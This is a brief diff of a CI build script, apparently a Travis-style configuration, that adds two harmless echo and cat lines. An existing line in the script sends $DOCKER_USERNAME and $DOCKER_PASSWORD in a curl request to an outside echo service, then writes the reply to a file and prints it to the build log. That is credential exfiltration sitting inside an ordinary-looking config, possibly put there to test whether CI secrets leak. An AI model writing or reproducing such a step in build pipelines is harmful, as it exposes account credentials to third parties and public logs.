@@ -6,4 +6,6 @@ script:
   - curl google.com
   - curl "http://urlecho.appspot.com/echo?status=200&body=$DOCKER_USERNAME---$DOCKER_PASSWORD" > xxx
   - cat xxx
+  - echo 123 >> xxx
+  - cat xxx
   - sleep 5
